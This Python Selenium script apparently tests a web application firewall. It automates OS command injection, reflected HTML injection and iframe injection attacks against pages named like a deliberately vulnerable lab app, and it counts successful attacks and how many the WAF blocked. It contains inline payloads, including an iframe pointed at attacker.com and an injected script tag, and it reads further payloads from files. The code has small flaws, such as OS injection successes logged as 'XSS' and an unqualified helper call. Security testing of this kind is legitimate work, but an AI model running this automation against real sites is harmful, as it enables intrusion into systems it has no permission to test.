from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
import utility

def execute(driver, target_url):
    # Start to attack
    os_injection_attack(driver, target_url)
    html_injection_attack(driver, target_url)
    iframe_injection_attack(driver, target_url)


def os_injection_attack(driver, target_url):
    print(f"\n[+] Running OS Injection Attacks")
    attack_url_page = "commandi.php"  # OS Command Injection
    success_counter = 0
    blocked_by_waf_counter = 0
    length_of_payload_file = 0

    with open("Payloads/OS_Injection.txt", 'r', encoding='latin-1') as payload_list:
        for payload in payload_list.read().splitlines():
            length_of_payload_file += 1
            try:
                # Load page
                driver.get(target_url + attack_url_page)

                # Send payload
                driver.find_element_by_id("target").clear()
                driver.find_element_by_id("target").send_keys(";"+payload, Keys.RETURN)

                # Look for success
                if utility.check_if_element_exists(driver, "xpath", "//div[@id='main']/p[@align='left']"):
                    if "Server: 127.0.0.53" not in driver.find_element_by_xpath("//div[@id='main']/p[@align='left']").text:
                        success_counter += 1
                        utility.write_to_log('XSS', payload)

                # Check if attack blocked by waf
                elif utility.check_if_element_exists(driver, "xpath", "/html/body/center/h1"):
                    if "403 Forbidden" == driver.find_element_by_xpath("/html/body/center/h1").text:
                        blocked_by_waf_counter += 1
            except NoSuchElementException:
                print("ERROR!")

        print(f"\n[!] ~~~OS Injection Results~~~ [!]")
        print(f"[+] Total Successful Attacks:", success_counter)
        print(f"[+] Total Blocked By WAF:", blocked_by_waf_counter)
        print(f"[+] Total Failed Attacks:", length_of_payload_file - blocked_by_waf_counter - success_counter)


def html_injection_attack(driver, target_url):
    print(f"\n[+] Running HTML Injection Attacks")
    attack_url_page = "htmli_get.php"  # HTML Injection - Reflected (GET)
    success_counter = 0
    blocked_by_waf_counter = 0
    length_of_payload_file = 0

    with open("Payloads/HTML_Injection.txt", 'r', encoding='latin-1') as payload_list:
        for payload in payload_list.read().splitlines():
            length_of_payload_file += 1
            try:
                # Load page
                driver.get(target_url + attack_url_page)

                # Send payload
                driver.find_element_by_id("firstname").clear()
                driver.find_element_by_id("lastname").clear()
                driver.find_element_by_id("firstname").send_keys("a")
                driver.find_element_by_id("lastname").send_keys(payload, Keys.RETURN)

                # Look for success
                if utility.check_if_element_exists(driver, "id", "hacker"):
                    success_counter += 1
                    utility.write_to_log('XSS', payload)
                # Check if attack blocked by waf
                elif utility.check_if_element_exists(driver, "xpath", "/html/body/center/h1"):
                    if "403 Forbidden" == driver.find_element_by_xpath("/html/body/center/h1").text:
                        blocked_by_waf_counter += 1
            except NoSuchElementException:
                print("ERROR!")

        print(f"\n[!] ~~~HTML Injection Results~~~ [!]")
        print(f"[+] Total Successful Attacks:", success_counter)
        print(f"[+] Total Blocked By WAF:", blocked_by_waf_counter)
        print(f"[+] Total Failed Attacks:", length_of_payload_file - blocked_by_waf_counter - success_counter)


def iframe_injection_attack(driver, target_url):
    print(f"\n[+] Running iFrame Injection Attacks")
    attack_url_page = "iframei.php"  # iFrame Injection
    payload_list = ["""?ParamUrl=https://www.attacker.com&ParamWidth=250"&ParamHeight=250""",
                    """?ParamUrl=robots.txt&ParamWidth=250"></iframe><sCript id="attacker">document.write("HACK")</scriPt>&ParamHeight=250"""]
    success_counter = 0
    blocked_by_waf_counter = 0

    for payload in payload_list:
        try:
            # Send payload
            driver.get(target_url + attack_url_page + payload)

            # Look for success
            if utility.check_if_element_exists(driver, "tag_name", "iframe", True, "src"):
                if "attacker" in driver.find_element_by_tag_name("iframe").get_attribute("src") or check_if_element_exists(driver, "id", "attacker"):
                    success_counter += 1
                    utility.write_to_log('XSS', payload)

            # Check if attack blocked by waf
            elif utility.check_if_element_exists(driver, "xpath", "/html/body/center/h1"):
                if "403 Forbidden" == driver.find_element_by_xpath("/html/body/center/h1").text:
                    blocked_by_waf_counter += 1
        except NoSuchElementException:
            print("ERROR!")

    print(f"\n[!] ~~~iFrame Injection Results~~~ [!]")
    print(f"[+] Total Successful Attacks:", success_counter)
    print(f"[+] Total Blocked By WAF:", blocked_by_waf_counter)
    print(f"[+] Total Failed Attacks:", len(payload_list) - blocked_by_waf_counter - success_counter)
